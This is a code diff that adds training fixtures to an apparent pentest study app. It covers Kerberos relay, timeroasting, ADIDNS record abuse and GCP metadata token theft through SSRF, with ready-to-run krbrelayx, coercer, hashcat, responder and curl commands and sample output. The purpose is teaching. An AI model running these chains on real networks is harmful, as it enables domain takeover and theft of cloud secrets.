@@ -5383,4 +5383,367 @@
   };
   Object.keys(GAPFILL4).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL4[k]; });
 
+  // --- Phase-E gap-fill: AD + cloud radar (beyond OSCP) ---
+  var GAPFILL5E = {
+    "kerberos-relay": {
+      "why": "NTLM relay is well known, but Kerberos can be relayed too, and it bypasses the SMB-signing defence that stops the NTLM version. You coerce a privileged machine (a DC, or any host) into authenticating to you with Kerberos, then relay that AP-REQ to a service that does not check channel binding (LDAP, or an AD CS web-enrollment endpoint). Relayed to LDAP you can write RBCD or shadow credentials onto the victim; relayed to AD CS you enrol a certificate as the victim machine, then authenticate as it. It is the modern answer when SMB signing is on everywhere and the classic NTLM relay is dead.",
+      "cmd": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
+      "tool": "krbrelayx",
+      "output": "[*] Authenticating against ldap://dc01.acme.internal as ACME\\DC01$\n[*] Adding new computer with username: evilpc$\n[*] Added msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "signal": "Added msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "teach": "The coerced Kerberos ticket was relayed to LDAP and wrote resource-based constrained delegation onto the victim. You can now request a service ticket as any user to it, which is SYSTEM on that host.",
+      "leadup": [
+        {
+          "key": "coerce",
+          "label": "You can coerce Kerberos auth",
+          "steps": [
+            {
+              "title": "Confirm a coercion vector",
+              "tool": "coercer",
+              "where": "local",
+              "cmd": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l {{lhost}}",
+              "out": "[+] (MS-RPRN) PrinterBug triggered, authentication incoming",
+              "sig": "authentication incoming",
+              "teach": "A reachable coercion method (PrinterBug, PetitPotam, DFSCoerce) is what forces the victim to authenticate to your relay."
+            }
+          ]
+        },
+        {
+          "key": "signing",
+          "label": "SMB signing stops NTLM relay",
+          "steps": [
+            {
+              "title": "Check SMB signing",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc smb {{target}} --gen-relay-list relay.txt",
+              "out": "SMB  {{target}}  signing:True (NTLM relay not possible)",
+              "sig": "signing:True",
+              "teach": "Signing enforced kills the NTLM relay, which is exactly when the Kerberos relay is the way through."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A Kerberos relay is coerce the victim to authenticate with Kerberos, relay the ticket to LDAP or AD CS, and use what that grants.",
+        "items": [
+          {
+            "t": "Set up the relay with a spoofed name",
+            "d": "Kerberos tickets are bound to a service name, so you relay through a DNS name that resolves to you (an ADIDNS record, or a name the target already trusts).",
+            "demo": [
+              {
+                "run": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
+                "out": "[*] Listening for incoming Kerberos authentication",
+                "sig": "Listening for incoming Kerberos"
+              }
+            ],
+            "note": "The relay target decides the win: LDAP for RBCD/shadow-cred, AD CS for a certificate."
+          },
+          {
+            "t": "Coerce the victim",
+            "d": "Trigger a coercion method so the victim authenticates to your spoofed name with Kerberos.",
+            "demo": [
+              {
+                "run": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l evilpc.acme.internal",
+                "out": "[+] PrinterBug triggered, authentication incoming",
+                "sig": "authentication incoming"
+              }
+            ],
+            "note": "The victim authenticates as its machine account, which is what you relay."
+          },
+          {
+            "t": "Relay to LDAP for RBCD",
+            "d": "The relayed ticket writes msDS-AllowedToActOnBehalfOfOtherIdentity on the victim, delegating it to a computer account you control.",
+            "demo": [
+              {
+                "run": "getST.py -spn cifs/victim.acme.internal -impersonate administrator 'acme.internal/evilpc$:{{password}}'",
+                "out": "Saving ticket in administrator.ccache",
+                "sig": "Saving ticket in administrator.ccache"
+              }
+            ],
+            "note": "The service ticket impersonates Administrator to the victim: SYSTEM on that host."
+          },
+          {
+            "t": "Or relay to AD CS",
+            "d": "Relayed to the web-enrollment endpoint, you enrol a machine certificate, then authenticate with it for the victim's hash.",
+            "demo": [
+              {
+                "run": "certipy auth -pfx victim.pfx -dc-ip {{target}}",
+                "out": "Got hash for 'victim$@acme.internal'",
+                "sig": "Got hash for"
+              }
+            ],
+            "note": "The machine hash is a foothold or a DCSync step depending on the victim."
+          }
+        ]
+      },
+      "situation": "SMB signing is enforced everywhere, so NTLM relay is dead, but you can coerce a host to authenticate. What is the move?",
+      "choices": [
+        "kerberos-relay",
+        "ntlm-relay-attack",
+        "coerce-auth",
+        "kerberoast"
+      ],
+      "coach": {
+        "ntlm-relay-attack": "Signing enforced kills the NTLM relay; the Kerberos relay is not stopped by SMB signing.",
+        "coerce-auth": "Coercion is how you trigger the auth; relaying the Kerberos ticket is what turns it into access.",
+        "kerberoast": "Roasting needs an SPN and a crackable password; the relay turns a coerced ticket straight into delegation."
+      }
+    },
+    "timeroasting": {
+      "why": "Timeroasting abuses the old MS-SNTP authentication in the Windows Time service: a client can ask the DC to sign an NTP reply using a computer account's NT hash as the key, and crucially it can do this for any computer RID without authenticating at all. You collect those signed replies, which are effectively NetNTLM-style hashes of each machine account, and crack them offline. Machine-account passwords are usually random and uncrackable, but plenty of environments have appliances, clusters, or old hosts with weak or scripted machine passwords, and one of those is a foothold with no credential spent to get it.",
+      "cmd": "python3 timeroast.py {{target}} | tee timeroast.hashes",
+      "tool": "timeroast",
+      "output": "1000:$sntp-ms$a1b2c3...$010203...\n1103:$sntp-ms$d4e5f6...$040506...",
+      "signal": "$sntp-ms$",
+      "teach": "Each line is a crackable hash of a computer account (keyed by its RID), pulled with no authentication. Crack them offline; a weak machine password is an unauthenticated foothold.",
+      "leadup": [
+        {
+          "key": "dc",
+          "label": "A DC is reachable",
+          "steps": [
+            {
+              "title": "Confirm the DC and NTP",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sU -p123 {{target}}",
+              "out": "123/udp open  ntp",
+              "sig": "123/udp open",
+              "teach": "The Windows Time service on a DC is what answers the signed-reply requests timeroasting abuses."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Timeroasting is request signed time replies for each computer RID, collect the hashes, and crack them offline.",
+        "items": [
+          {
+            "t": "Collect the hashes",
+            "d": "The tool walks computer RIDs and asks the DC to sign a time reply with each account's key, with no authentication at all.",
+            "demo": [
+              {
+                "run": "python3 timeroast.py {{target}} | tee timeroast.hashes",
+                "out": "1000:$sntp-ms$a1b2c3...$010203...",
+                "sig": "$sntp-ms$"
+              }
+            ],
+            "note": "No credential is needed; this works pre-auth against the DC."
+          },
+          {
+            "t": "Crack them offline",
+            "d": "Feed the hashes to hashcat in the timeroast mode and run a wordlist; weak or scripted machine passwords fall.",
+            "demo": [
+              {
+                "run": "hashcat -m 31300 timeroast.hashes {{wordlist}}",
+                "out": "1103:$sntp-ms$d4e5f6...:Autumn2024",
+                "sig": ":Autumn2024"
+              }
+            ],
+            "note": "Most machine passwords are random, but appliances and old hosts often are not."
+          },
+          {
+            "t": "Map the RID to a host",
+            "d": "Resolve the cracked RID back to a computer name so you know which host the password belongs to.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query '(objectSid=*-1103)' 'sAMAccountName'",
+                "out": "sAMAccountName: APPLIANCE01$",
+                "sig": "APPLIANCE01$"
+              }
+            ],
+            "note": "A machine credential authenticates as that host and often reuses onto its services."
+          }
+        ]
+      },
+      "situation": "You have no credential yet, but a DC is reachable and you want machine-account hashes without touching Kerberos pre-auth. What is the move?",
+      "choices": [
+        "timeroasting",
+        "asrep-roast",
+        "kerberoast",
+        "password-spray"
+      ],
+      "coach": {
+        "asrep-roast": "AS-REP roasting needs user accounts with pre-auth disabled; timeroasting pulls computer hashes with no auth at all.",
+        "kerberoast": "Roasting needs a valid domain credential first; timeroasting is fully unauthenticated.",
+        "password-spray": "Spraying needs a user list and risks lockout; timeroasting hands you offline hashes instead."
+      }
+    },
+    "adidns-abuse": {
+      "why": "Active Directory integrated DNS lets any authenticated user create DNS records by default, and that is a surprisingly sharp primitive. A wildcard record (*.acme.internal) makes you the answer for every name that does not already exist, so you intercept the traffic of misconfigured clients; a WPAD record turns on proxy auto-discovery you control, capturing web auth; and a record you own is the name a coerced or relayed authentication is sent to. It is the quiet enabler under a lot of relay chains: you need a name that resolves to your box, and ADIDNS hands you one with a single authenticated LDAP write.",
+      "cmd": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+      "tool": "dnstool",
+      "output": "[+] Adding new record\n[+] LDAP operation completed successfully",
+      "signal": "LDAP operation completed successfully",
+      "teach": "The wildcard record is live, so any name with no explicit record now resolves to you. That captures mistyped and fallback lookups, and gives relay chains a name that points at your listener.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "Confirm you can write DNS",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc ldap {{target}} -u {{user}} -p '{{password}}'",
+              "out": "LDAP  {{target}}  [+] acme.internal\\{{user}}",
+              "sig": "[+] acme.internal",
+              "teach": "Any authenticated user can create ADIDNS records by default, which is all this needs."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "ADIDNS abuse is write a record that points a useful name at you, then collect what resolves to it.",
+        "items": [
+          {
+            "t": "Add a wildcard record",
+            "d": "A wildcard answers every name without an explicit record, so you catch fallback and mistyped lookups across the domain.",
+            "demo": [
+              {
+                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+                "out": "[+] LDAP operation completed successfully",
+                "sig": "LDAP operation completed successfully"
+              }
+            ],
+            "note": "Give it a few minutes to replicate before you expect hits."
+          },
+          {
+            "t": "Or add a WPAD record",
+            "d": "A WPAD record turns on proxy auto-discovery pointed at you, which captures the web authentication of clients that honour it.",
+            "demo": [
+              {
+                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
+                "out": "[+] LDAP operation completed successfully",
+                "sig": "LDAP operation completed successfully"
+              }
+            ],
+            "note": "WPAD is often blocked by GPO; the wildcard is the more reliable primitive."
+          },
+          {
+            "t": "Capture what resolves to you",
+            "d": "Run a responder-style listener on your box; names that now resolve to you send their authentication straight to it.",
+            "demo": [
+              {
+                "run": "responder -I {{iface}} -w",
+                "out": "[SMB] NTLMv2-SSP Hash : ACME\\jsmith",
+                "sig": "NTLMv2-SSP Hash",
+                "teach": ""
+              }
+            ],
+            "note": "Feed the captured hash into the crack or the relay loop."
+          },
+          {
+            "t": "Feed a relay",
+            "d": "The record also gives a coerced or relayed authentication a name that points at your listener, which is what the Kerberos and NTLM relays need.",
+            "note": "This is why ADIDNS sits under so many relay chains."
+          }
+        ]
+      },
+      "situation": "You have one domain credential and need a name in the domain that resolves to your box, to capture auth or anchor a relay. What is the move?",
+      "choices": [
+        "adidns-abuse",
+        "mitm6-ipv6-takeover",
+        "responder-poison",
+        "coerce-auth"
+      ],
+      "coach": {
+        "mitm6-ipv6-takeover": "mitm6 works where IPv6 is on; ADIDNS writes a durable name in IPv4 DNS with the credential you already hold.",
+        "responder-poison": "Responder answers link-local name requests; ADIDNS plants an authoritative record the whole domain honours.",
+        "coerce-auth": "Coercion forces the auth; ADIDNS gives it a name to be sent to."
+      }
+    },
+    "gcp-metadata": {
+      "why": "Google Cloud's metadata server at 169.254.169.254 hands out an OAuth access token for the instance's attached service account to anything that can reach it, so a server-side request forgery on a GCP-hosted app is a token for the project. Like Azure it needs a header (Metadata-Flavor: Google) that the SSRF has to smuggle, and the token's reach is whatever scopes and IAM roles the service account carries. With the token you enumerate the project, read Secret Manager and Cloud Storage, and look for a role (or an actAs on another service account) that lets you deploy a function or a VM and run code. It is the GCP twin of the AWS and Azure metadata paths, and increasingly in scope.",
+      "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
+      "tool": "curl",
+      "output": "{\"access_token\":\"ya29.a0Af...\",\"expires_in\":3599,\"token_type\":\"Bearer\"}",
+      "signal": "ya29.",
+      "teach": "The service-account OAuth token came back (GCP tokens start ya29.). Use it with gcloud or the REST API to enumerate the project, read Secret Manager, and hunt for a role that runs code.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reaches the metadata server",
+          "steps": [
+            {
+              "title": "Confirm you are on GCP",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -H 'Metadata-Flavor: Google' 'http://<target>/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/?recursive=true'",
+              "out": "{\"machineType\":\"projects/12345/machineTypes/e2-medium\",\"zone\":\"projects/12345/zones/us-central1-a\"}",
+              "sig": "machineType",
+              "teach": "Instance metadata confirms a GCP VM and names the project, so a service-account token is likely reachable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "GCP metadata abuse is smuggle the token out through the SSRF, then use it to enumerate and loot the project.",
+        "items": [
+          {
+            "t": "Pull the service-account token",
+            "d": "Ask the metadata server for the default service account's OAuth token, passing the Metadata-Flavor header the SSRF must smuggle.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
+                "out": "{\"access_token\":\"ya29.a0Af...\"}",
+                "sig": "ya29."
+              }
+            ],
+            "note": "Check the account's scopes at .../default/scopes; a cloud-platform scope is the broad one."
+          },
+          {
+            "t": "Enumerate what the token can see",
+            "d": "Load the token into gcloud or call the REST API to list projects, buckets, secrets, and service accounts the identity can reach.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://cloudresourcemanager.googleapis.com/v1/projects'",
+                "out": "\"projectId\": \"acme-prod\"",
+                "sig": "projectId"
+              }
+            ],
+            "note": "The IAM roles on the service account decide how far you get."
+          },
+          {
+            "t": "Loot Secret Manager and Storage",
+            "d": "Read stored secrets and bucket objects, which routinely hold database and admin credentials that reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets/db-password/versions/latest:access'",
+                "out": "\"payload\":{\"data\":\"UHIwZERiUEBzcw==\"}",
+                "sig": "payload",
+                "teach": ""
+              }
+            ],
+            "note": "The value is base64; decode it and feed it into the credential loop."
+          },
+          {
+            "t": "Look for code execution",
+            "d": "A role that lets you actAs a service account and deploy a function or VM gives you execution in the project.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://iam.googleapis.com/v1/projects/acme-prod/serviceAccounts'",
+                "out": "\"email\": \"deployer@acme-prod.iam.gserviceaccount.com\"",
+                "sig": "gserviceaccount.com"
+              }
+            ],
+            "note": "actAs on a privileged service account is the escalation to execution."
+          }
+        ]
+      },
+      "situation": "An SSRF on a GCP VM can reach 169.254.169.254 with the Metadata-Flavor header. What turns it into access?",
+      "choices": [
+        "gcp-metadata",
+        "azure-imds",
+        "aws-credential-abuse",
+        "ssrf"
+      ],
+      "coach": {
+        "azure-imds": "That is the Azure path; GCP uses the Metadata-Flavor header and an OAuth token that starts ya29.",
+        "aws-credential-abuse": "That is the AWS path; GCP hands an OAuth token, not AWS keys.",
+        "ssrf": "The SSRF is how you reach the metadata server; now pull the service-account token and use it."
+      }
+    }
+  };
+  Object.keys(GAPFILL5E).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5E[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
